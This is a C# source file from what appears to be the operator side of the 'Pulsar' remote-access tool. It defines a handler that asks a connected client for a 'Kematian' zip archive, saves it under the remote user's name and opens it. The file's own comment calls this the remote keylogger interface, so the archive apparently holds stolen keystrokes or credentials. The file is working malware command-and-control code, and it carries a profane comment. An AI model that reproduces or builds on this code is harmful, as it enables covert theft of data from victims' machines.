using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using Pulsar.Server.Models;
using Pulsar.Server.Networking;
using System;
using System.IO;
using System.IO.Compression;
using System.Windows.Forms;
using System.Diagnostics;
using Pulsar.Common.Messages.Monitoring.Kematian;
using Pulsar.Common.Messages.other;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote keylogger.
    /// </summary>
    public class KematianHandler : MessageProcessorBase<string>, IDisposable
    {
        private readonly Client _client;

        public KematianHandler(Client client) : base(true)
        {
            _client = client;
            MessageHandler.Register(this);
        }

        public override bool CanExecute(IMessage message) => message is GetKematian;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            if (message is GetKematian zipMessage)
            {

                //public string DownloadDirectory => _downloadDirectory ?? (_downloadDirectory = (!FileHelper.HasIllegalCharacters(UserAtPc))
                //                       ? Path.Combine(Application.StartupPath, $"Clients\\{UserAtPc}_{Id.Substring(0, 7)}\\")
                //                       : Path.Combine(Application.StartupPath, $"Clients\\{Id}\\"));
                string outPath = Path.Combine(Application.StartupPath, "Kematian");

                if (!Directory.Exists(outPath))
                {
                    Directory.CreateDirectory(outPath);
                }

                string writePath = Path.Combine(outPath, $"{_client.Value.Username}_Kematian.zip");

                try
                {
                    File.WriteAllBytes(writePath, zipMessage.ZipFile);
                    System.Diagnostics.Process.Start(writePath);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex.Message);
                }
            }

            Dispose(); // we only want to receive the zip file once then we can fucking kill the handler like a real programmer
        }

        public void RequestKematianZip()
        {
            var request = new GetKematian();
            _client.Send(request);
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                MessageHandler.Unregister(this);
            }
        }
    }
}
